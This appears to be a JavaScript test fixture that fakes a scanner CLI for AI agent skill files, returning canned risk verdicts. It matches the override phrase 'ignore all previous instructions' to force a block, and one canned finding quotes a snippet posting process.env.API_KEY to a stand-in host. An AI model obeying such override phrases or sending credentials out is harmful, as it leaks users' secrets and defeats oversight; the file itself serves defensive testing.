// A stand-in for the NVIDIA SkillSpector CLI, used only by the test suite. It
// returns the same JSON shape the real tool documents, so JIT's parser and the
// install gate are exercised without pulling the real (heavy, Python) toolchain
// or making a network call. Set FAKE_SKILLSPECTOR_SCENARIO to force a verdict.
import { readFileSync, statSync } from "node:fs";
import path from "node:path";

const args = process.argv.slice(2);

if (args.includes("--version")) {
  process.stdout.write("skillspector 2.12.0 (fake)\n");
  process.exit(0);
}

const scanAt = args.indexOf("scan");
const target = scanAt >= 0 ? args[scanAt + 1] || "" : "";
const noLlm = args.includes("--no-llm");

function readTarget(value) {
  try {
    return statSync(value).isDirectory()
      ? readFileSync(path.join(value, "SKILL.md"), "utf8")
      : readFileSync(value, "utf8");
  } catch {
    return "";
  }
}

const text = readTarget(target);
const scenario = process.env.FAKE_SKILLSPECTOR_SCENARIO || "auto";

let verdict;
if (scenario === "do_not_install" || /ignore all previous instructions/i.test(text)) {
  verdict = {
    score: 78,
    severity: "HIGH",
    recommendation: "DO_NOT_INSTALL",
    issues: [
      {
        id: "E2",
        category: "Data Exfiltration",
        severity: "HIGH",
        confidence: 0.94,
        message: "Reads credentials and posts them to an external host.",
        explanation: "The skill collects credentials and sends them to an untrusted server.",
        finding: "process.env.API_KEY",
        code_snippet: "post('https://example.invalid', process.env.API_KEY)",
        remediation: "Remove the credential access and outbound transmission.",
        tags: ["credential-access", "network-egress"],
        evidence: { destination: "https://example.invalid" },
        location: { file: "SKILL.md", start_line: 3 },
      },
    ],
  };
} else if (scenario === "caution") {
  verdict = {
    score: 32,
    severity: "MEDIUM",
    recommendation: "CAUTION",
    issues: [
      {
        id: "B4",
        category: "Excessive Agency",
        severity: "MEDIUM",
        confidence: 0.7,
        message: "Requests broader permissions than the task needs.",
      },
    ],
  };
} else {
  verdict = { score: 0, severity: "LOW", recommendation: "SAFE", issues: [] };
}

process.stdout.write(
  JSON.stringify({
    skill: {
      name: path.basename(target || "skill"),
      source: target,
      scanned_at: new Date().toISOString(),
    },
    risk_assessment: {
      score: verdict.score,
      severity: verdict.severity,
      recommendation: verdict.recommendation,
    },
    components: [],
    issues: verdict.issues,
    metadata: {
      has_executable_scripts: false,
      skillspector_version: "2.12.0",
      llm_requested: !noLlm,
      llm_available: !noLlm,
      llm_error: null,
    },
  }) + "\n",
);
process.exit(verdict.recommendation === "DO_NOT_INSTALL" ? 1 : 0);
